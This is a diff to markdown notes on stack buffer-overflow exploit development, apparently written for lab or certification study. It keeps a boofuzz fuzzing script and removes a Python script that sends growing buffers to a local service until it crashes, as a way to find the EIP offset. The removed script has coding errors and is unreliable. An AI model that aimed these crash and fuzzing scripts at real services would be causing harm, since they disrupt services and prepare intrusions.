@@ -2,8 +2,6 @@
 
 ## Spiking/Fuzzing
 
-Also we can use boofuzz. This python module will do a lot of work for us and also create a database of results.
-
 ```python
 #!/usr/bin/env python3
 from boofuzz import *
@@ -23,35 +21,10 @@ s.fuzz()
 ```
 
 ```text
-generic_send_tcp
+generic_send_tcp...
 ```
 
 ## Finding offset of EIP
-
-This script can five us general idea.
-
-```python
-#!/usr/bin/env python3
-import sys, sockets
-from time import sleep
-
-buffer = "1" * 64
-RHOST = "127.0.0.1"
-RPORT = 9999
-
-while True:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((RHOST,RPORT))
-        s.send("change_me " + buffer)
-        s.close()
-        sleep(1)
-        buffer = buffer + "1"*64
-    except:
-        print("Crashed at buffer length of: " + str(len(buffer)))
-```
-
-Better way to find EIP is to send a non-repeating pattern of characters.
 
 ```python
 #!/usr/bin/env python3
